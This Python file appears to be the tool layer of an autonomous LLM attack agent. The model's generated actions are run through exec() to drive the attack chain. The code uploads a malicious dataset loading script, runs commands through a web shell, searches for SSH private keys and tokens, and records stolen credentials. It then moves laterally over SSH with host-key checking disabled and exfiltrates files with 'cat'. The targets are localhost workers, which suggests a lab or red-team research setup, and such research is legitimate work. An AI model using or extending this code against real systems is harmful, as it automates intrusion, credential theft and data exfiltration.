import os
import time
import zipfile
import requests
from state import AttackState

WORKER_UPLOAD = "http://localhost:8080/upload"
WORKER_SHELL  = "http://localhost:5555"

_task_queue: list[tuple] = []


# ── API functions (called by LLM inside <action>, queues tasks) ──

def scan(url: str):
    _task_queue.append(("scan", url))

def upload_payload(script: str):
    _task_queue.append(("upload", script))

def exec_cmd(command: str):
    _task_queue.append(("exec", command))

def find_information(command: str):
    _task_queue.append(("find", command))

def save_credential(key: str, value: str):
    _task_queue.append(("save_cred", key, value))

def lateral_move(ip: str, user: str, key_path: str, cmd: str):
    _task_queue.append(("lateral", ip, user, key_path, cmd))

def exfiltrate_data(ip: str, user: str, key_path: str, path: str):
    _task_queue.append(("exfil", ip, user, key_path, path))

def wait(seconds: int):
    _task_queue.append(("wait", seconds))


# ── Agents (actual execution logic, return structured results) ───

class ScanAgent:
    def run(self, url: str) -> dict:
        try:
            r = requests.get(url, timeout=3)
            return {
                "status": "SUCCESS",
                "action": "scan",
                "url": url,
                "http_code": r.status_code,
                "note": r.text[:200]
            }
        except Exception as e:
            return {"status": "FAILED", "action": "scan", "url": url, "error": str(e)}


class UploadAgent:
    def run(self, script: str) -> dict:
        try:
            os.makedirs("/tmp/hf_agent", exist_ok=True)
            with open("/tmp/hf_agent/loading_script.py", "w") as f:
                f.write(script)
            with zipfile.ZipFile("/tmp/hf_agent/dataset.zip", "w") as z:
                z.write("/tmp/hf_agent/loading_script.py", "loading_script.py")
            with open("/tmp/hf_agent/dataset.zip", "rb") as f:
                r = requests.post(WORKER_UPLOAD, files={"dataset": ("dataset.zip", f)})
            return {
                "status": "SUCCESS" if r.status_code == 200 else "FAILED",
                "action": "upload_payload",
                "http_code": r.status_code,
                "note": r.text
            }
        except Exception as e:
            return {"status": "FAILED", "action": "upload_payload", "error": str(e)}


class ShellAgent:
    def run(self, command: str) -> dict:
        # Wrap with || true so the web shell always captures real output
        safe_command = f"{{ {command}; }} 2>&1 || true"
        try:
            r = requests.post(WORKER_SHELL, data=safe_command.encode(), timeout=15)
            output = r.text.strip()
            return {
                "status": "SUCCESS",
                "action": "exec_cmd",
                "command": command,
                "output": output[:500]
            }
        except Exception as e:
            return {"status": "FAILED", "action": "exec_cmd", "command": command, "error": str(e)}


class FindInfoAgent:
    def run(self, command: str) -> dict:
        try:
            r = requests.post(WORKER_SHELL, data=command.encode(), timeout=15)
            output = r.text.strip()
            found = []
            if "id_rsa" in output:
                found.append("SSH private key id_rsa")
            if "token" in output.lower() or "key" in output.lower():
                found.append("possible credential")
            return {
                "status": "SUCCESS",
                "action": "find_information",
                "command": command,
                "output": output[:500],
                "found": found
            }
        except Exception as e:
            return {"status": "FAILED", "action": "find_information", "error": str(e)}


class LateralMoveAgent:
    def run(self, ip: str, user: str, key_path: str, cmd: str) -> dict:
        ssh_cmd = f"{{ ssh -n -i {key_path} -o StrictHostKeyChecking=no {user}@{ip} '{cmd}'; }} 2>&1 || true"
        try:
            r = requests.post(WORKER_SHELL, data=ssh_cmd.encode(), timeout=20)
            output = r.text.strip()
            return {
                "status": "SUCCESS" if output else "FAILED",
                "action": "lateral_move",
                "target": f"{user}@{ip}",
                "output": output[:500]
            }
        except Exception as e:
            return {"status": "FAILED", "action": "lateral_move", "target": ip, "error": str(e)}


class ExfiltrateAgent:
    def run(self, ip: str, user: str, key_path: str, path: str) -> dict:
        ssh_cmd = f"ssh -n -i {key_path} -o StrictHostKeyChecking=no {user}@{ip} 'cat {path}'"
        try:
            r = requests.post(WORKER_SHELL, data=ssh_cmd.encode(), timeout=20)
            output = r.text.strip()
            return {
                "status": "SUCCESS" if output else "FAILED",
                "action": "exfiltrate_data",
                "path": path,
                "data": output[:1000]
            }
        except Exception as e:
            return {"status": "FAILED", "action": "exfiltrate_data", "path": path, "error": str(e)}


# ── Dispatcher (execute all queued tasks and update state) ───────

def dispatch_all_queued_tasks(state: AttackState) -> list[dict]:
    global _task_queue
    results = []

    for task in _task_queue:
        action = task[0]

        if action == "scan":
            result = ScanAgent().run(task[1])
            if result["status"] == "SUCCESS":
                state.discovered_services.append(task[1])

        elif action == "upload":
            result = UploadAgent().run(task[1])

        elif action == "exec":
            result = ShellAgent().run(task[1])
            if result["status"] == "SUCCESS" and task[1].strip() == "whoami":
                host = result.get("output", "")
                if host and host not in state.gained_shells:
                    state.gained_shells.append(f"Worker({host})")

        elif action == "find":
            result = FindInfoAgent().run(task[1])

        elif action == "save_cred":
            state.found_credentials[task[1]] = task[2]
            result = {
                "status": "SUCCESS",
                "action": "save_credential",
                "key": task[1],
                "note": "Credential saved to attack state"
            }

        elif action == "lateral":
            result = LateralMoveAgent().run(task[1], task[2], task[3], task[4])
            if result["status"] == "SUCCESS" and "Permission denied" not in result.get("output", ""):
                host = f"{task[2]}@{task[1]}"
                if host not in state.compromised_hosts:
                    state.compromised_hosts.append(host)

        elif action == "exfil":
            result = ExfiltrateAgent().run(task[1], task[2], task[3], task[4])
            if result["status"] == "SUCCESS":
                state.exfiltrated_data.append(result.get("data", ""))

        elif action == "wait":
            time.sleep(task[1])
            result = {
                "status": "SUCCESS",
                "action": "wait",
                "note": f"Waited {task[1]} seconds"
            }

        else:
            result = {"status": "FAILED", "action": action, "error": "Unknown action"}

        results.append(result)

    _task_queue = []
    return results


# ── Namespace exposed to exec() ──────────────────────────────────

AGENT_NAMESPACE = {
    "scan": scan,
    "upload_payload": upload_payload,
    "exec_cmd": exec_cmd,
    "find_information": find_information,
    "save_credential": save_credential,
    "lateral_move": lateral_move,
    "exfiltrate_data": exfiltrate_data,
    "wait": wait,
}
